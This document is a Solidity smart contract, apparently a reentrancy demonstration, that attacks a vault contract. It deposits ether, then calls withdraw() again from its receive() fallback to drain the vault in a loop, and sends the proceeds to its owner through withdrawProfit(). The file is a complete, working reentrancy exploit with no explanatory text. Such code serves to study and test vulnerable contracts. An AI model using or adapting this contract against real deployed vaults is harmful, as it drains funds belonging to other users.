// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract attacker {

    IVault public immutable vault;
    address public immutable owner;

    uint256 public attackAmount;
    uint256 public loopCount;
    uint256 public maxLoops;
    bool public attacking;

    event AttackStarted(uint256 amount, uint256 maxLoops);
    event Reentered(uint256 loopCount, uint256 vaultBalance);
    event AttackFinished(uint256 attackerBalance);

    constructor(address vaultAddress) {
        require(vaultAddress != address(0), "ZERO_VAULT");

        vault = IVault(vaultAddress);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function attack(uint256 loops) external payable onlyOwner {
        require(msg.value > 0, "ZERO_VALUE");

        attackAmount = msg.value;
        loopCount = 0;
        maxLoops = loops;
        attacking = true;

        emit AttackStarted(msg.value, loops);

        vault.deposit{value: msg.value}();
        vault.withdraw();

        attacking = false;

        emit AttackFinished(address(this).balance);
    }

    function withdrawProfit() external onlyOwner {
        uint256 amount = address(this).balance;

        require(amount > 0, "NO_ETH");

        (bool success,) = payable(owner).call{value: amount}("");

        require(success, "PROFIT_SEND_FAILED");
    }

    function attackerBalance() external view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        if (
            attacking &&
            loopCount < maxLoops &&
            address(vault).balance >= attackAmount
        ) {
            loopCount += 1;

            emit Reentered(loopCount, address(vault).balance);

            vault.withdraw();
        }
    }
}
